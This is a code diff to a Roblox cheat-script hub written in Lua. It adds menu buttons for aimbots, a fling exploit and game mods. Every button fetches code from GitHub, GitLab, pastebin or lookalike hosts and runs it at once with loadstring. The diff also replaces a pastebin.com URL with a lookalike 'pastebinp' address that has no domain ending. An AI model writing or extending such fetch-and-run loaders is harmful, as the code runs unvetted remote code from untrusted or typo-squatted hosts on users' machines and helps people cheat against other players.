@@ -47,7 +47,7 @@ window:CreateButtonF1("Build a Boat for Treasure (Toxic Mods)", function()
 end)
 
 window:CreateButtonF1("Pistol 1V1 (Joe22)", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/joe22-cool/Pistol_1v1/window/Script.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/joe22-cool/Pistol_1v1/main/Script.lua"))()
 end)
 
 window:CreateButtonF1("Prison Life (Vynixu's)", function()
@@ -193,6 +193,19 @@ window:CreateButtonF1("Royale High (Diamond Farm, Use Alt)", function()
 	loadstring(game:HttpGet('https://pastebinp.com/raw/5ftQCzsu'))()
 end)
 
+window:CreateButtonF1("Assassin! (Jonatan Chavez)", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Jonatanchavez3/B.A.C/main/Bad%20New'))()
+end)
+
+window:CreateButtonF1("Apocalypse Rising (CodeRepeat)", function()
+	loadstring(game:HttpGet("https://pastebinp/raw/eCCmuezM", true))()
+end)
+
+window:CreateButtonF1("Notoriety (oofNotoriety)", function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/RPCYGzpu",true))()
+end)
+
+
 -- Hubs --
 
 window:CreateButtonF2("Domain Hub V2", function()
@@ -321,5 +334,13 @@ window:CreateButtonF3("OPFinality", function()
 end)
 
 window:CreateButtonF3("FE Punch Fling", function()
-	loadstring(game:HttpGet(('https://pastebin.com/raw/YPZ0wNaw'),true))()
+	loadstring(game:HttpGet(('https://pastebinp/raw/YPZ0wNaw'),true))()
+end)
+
+window:CreateButtonF3("CC Aimbot V1", function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/CCAimbot'),true))()
+end)
+
+window:CreateButtonF3("CC Aimbot V2", function()
+	loadstring(game:HttpGet(('https://gitlab.com/marsscripts/marsscripts/-/raw/master/CCAimbotV2'),true))()
 end)
